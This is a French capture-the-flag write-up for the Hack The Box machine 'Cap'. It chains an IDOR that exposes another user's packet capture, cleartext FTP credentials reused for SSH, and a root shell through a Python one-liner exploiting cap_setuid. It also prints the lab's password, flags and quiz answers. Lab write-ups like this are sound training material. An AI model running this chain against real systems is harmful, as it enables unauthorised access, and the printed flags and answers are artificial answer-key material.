[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine 1 — CAP

**IDOR sur PCAP + capabilities Linux (cap_setuid) — Easy Linux**

## Concept

Un dashboard web Flask/Gunicorn permet de lancer un "Security Snapshot"
(capture réseau) et de la télécharger via un ID incrémental. Une IDOR
(Insecure Direct Object Reference) permet d'accéder aux captures des
autres utilisateurs, révélant des identifiants FTP en clair dans un
pcap. La privesc exploite ensuite une capability Linux (cap_setuid)
posée sur l'interpréteur Python.

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["Port 80: dashboard web<br/>Security Snapshot"]
    B --> C["IDOR sur /data/id<br/>id = 0"]
    C --> D["Télécharge le PCAP<br/>d'un autre utilisateur"]
    D --> E["Wireshark: filtre ftp<br/>creds en clair"]
    E --> F["nathan : Buck3tH4TF0RM3!"]
    F --> G["SSH avec les mêmes creds<br/>réutilisation FTP → SSH"]
    G --> H["getcap -r /<br/>python3.8 = cap_setuid+eip"]
    H --> I["os.setuid(0)<br/>→ root"]
```

## Méthodologie — commandes complètes

> nmap -sC -sV 10.129.x.x
>
> \# → 21/tcp FTP (vsftpd), 22/tcp SSH, 80/tcp HTTP (Gunicorn, "Security
> Dashboard")
>
> \# Le FTP anonyme est fermé ici — fausse piste, se concentrer sur le
> site web
>
> \# Lancer un "Security Snapshot" sur le site -\> redirection observée
> :
>
> \# http://10.129.x.x/data/\<id\>
>
> \# IDOR : changer l'id pour accéder aux scans des autres utilisateurs
>
> http://10.129.x.x/data/0
>
> \# Télécharger le pcap correspondant :
>
> http://10.129.x.x/data/0/download
>
> \# Analyse du pcap avec Wireshark
>
> wireshark data_0.pcap
>
> \# Filtre : ftp.request.command == "USER" or ftp.request.command ==
> "PASS"
>
> \# -\> identifiants FTP en clair : nathan / Buck3tH4TF0RM3!
>
> \# Le mot de passe FTP est réutilisé pour SSH
>
> ssh nathan@10.129.x.x
>
> \# Password : Buck3tH4TF0RM3!
>
> cat user.txt
>
> \# → 61b0186a70164919f0be2de0139cc03f
>
> \# --- Privilege escalation ---
>
> getcap -r / 2\>/dev/null
>
> \# → /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
>
> \# /usr/bin/ping = cap_net_raw+ep
>
> \# /usr/bin/traceroute6.iputils = cap_net_raw+ep
>
> \# /usr/bin/mtr-packet = cap_net_raw+ep
>
> \# cap_setuid permet à python3.8 de changer son UID vers 0 (root)
>
> /usr/bin/python3.8 -c 'import os; os.setuid(0);
> os.system("/bin/bash")'
>
> whoami \# root
>
> cat /root/root.txt
>
> \# → e7f342183e8016c7e5786586752b50d1

## Flags

|          |                                  |
|----------|----------------------------------|
| **Flag** | **Valeur**                       |
| User     | 61b0186a70164919f0be2de0139cc03f |
| Root     | e7f342183e8016c7e5786586752b50d1 |

## Réponses aux questions HTB

|                                                 |             |
|-------------------------------------------------|-------------|
| **Question**                                    | **Réponse** |
| How many TCP ports are open?                    | **3**       |
| Path format /\[something\]/\[id\] → something = | **data**    |
| Able to get other users' scans?                 | **yes**     |
| ID of the PCAP with sensitive data              | **0**       |
| Application layer protocol with sensitive data  | **ftp**     |
| Other service where the password works          | **ssh**     |

## Points clés

- Une IDOR sur un ID de ressource incrémental (/data/\<id\>) permet
  souvent d'accéder aux données d'autres utilisateurs simplement en
  changeant le nombre — toujours tester id-1, id=0, etc.

- Les fichiers PCAP capturés par une application peuvent contenir des
  identifiants en clair pour des protocoles non chiffrés (FTP, HTTP,
  Telnet) — toujours les analyser avec Wireshark ou tshark après
  IDOR/téléchargement.

- La réutilisation de mot de passe entre FTP et SSH pour un même
  utilisateur est une faille humaine très fréquente.

- Les Linux capabilities (getcap -r /) sont l'équivalent moderne du bit
  SUID, mais accordent des privilèges plus granulaires (ex: cap_setuid,
  cap_net_raw). getcap -r / doit être un réflexe systématique en
  énumération de privesc Linux, au même titre que find / -perm -4000.

- cap_setuid+eip sur un interpréteur (Python, Perl, etc.) permet un
  changement d'UID direct vers 0 depuis un script one-liner, sans
  exploit complexe.

## Leçon retenue

*Une simple IDOR sur un numéro d'identifiant, combinée à une capture
réseau contenant des identifiants en clair et une capability Linux mal
restreinte, suffit à obtenir un accès root complet. Les capabilities
Linux méritent la même attention que les binaires SUID lors de toute
énumération de privesc.*

---

[⬆ Index Machines](README.md) · [Suivant : Orion ➡](orion.md)
